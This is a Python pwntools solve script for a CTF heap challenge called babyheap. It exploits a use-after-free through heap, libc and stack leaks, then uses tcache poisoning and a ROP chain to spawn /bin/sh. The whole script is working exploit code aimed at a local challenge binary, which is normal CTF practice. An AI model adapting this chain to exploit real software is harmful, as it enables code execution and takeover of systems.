#!/usr/bin/env python3
"""justCTF 2025 - babyheap solve script
Vulnerability: UAF in delete function (pointer not NULLed after free)
Technique: UAF leak -> tcache poisoning -> fake unsorted bin -> ROP on stack
"""
from pwn import *

context.arch = 'amd64'
elf = context.binary = ELF("./binary", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def start():
    return process([elf.path], env={"LD_PRELOAD": libc.path})

def mangle(ptr, pos):
    return ptr ^ (pos >> 12)

def create(idx, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index? ", str(idx).encode())
    io.sendafter(b"Data? ", data)

def read(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index? ", str(idx).encode())
    return io.recv(0x30)

def update(idx, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index? ", str(idx).encode())
    io.sendafter(b"Data? ", data)

def delete(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Index? ", str(idx).encode())

io = start()

# Heap layout
for i in range(9):
    create(i, b'F' * 8)

# Free tcache part
for i in range(8):
    delete(i)

# Parse heap leak
read(0)
io.recv(8)
heap = u64(io.recv(8))
heap = int(hex(heap) + "000", 16)
log.success(f'Leaked heap: {hex(heap)}')

create(9, b'C' * 8)
delete(8)

# Cause scanf to malloc, triggering malloc_consolidate
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"dex?", b"0"*0x400)

# Parse libc leak
read(7)
io.recv(8)
libc.address = u64(io.recv(8)) - 0x203b50
log.success(f"Leaked libc: {hex(libc.address)}")

# Tcache poisoning for stack leak
libc_argv = libc.address + 0x2046e0
chunks = heap + 0x2A0

for i in range(10, 15):
    create(i, b'P' * 8)

update(1, p64(mangle(chunks + 1 * 0x30, libc_argv)))
create(15, b'A')
create(16, b'A')

# Parse stack leak
read(16)
io.recv(8)
stack = u64(io.recv(8)) - 0x41
log.success(f"Leaked main stack frame: {hex(stack)}")
main_ret_addr = stack - 0x30

# Tcache poisoning again for ROP
create(17, b'B' * 8)
delete(15)
delete(17)

update(17, p64(mangle(heap + 0x2e0, main_ret_addr)))
create(18, b'a')
create(19, b'B' * 8)

# ROP chain
pop_rdi = p64(libc.address + 0x000000000010f75b)
bin_sh = p64(next(libc.search(b'/bin/sh\x00')))
ret = p64(libc.address + 0x000000000002882f)

payload = flat([
    b'B' * 8,
    ret,
    pop_rdi,
    bin_sh,
    p64(libc.sym.system)
])

update(19, payload)
io.sendlineafter(b"> ", b"0")
io.interactive()
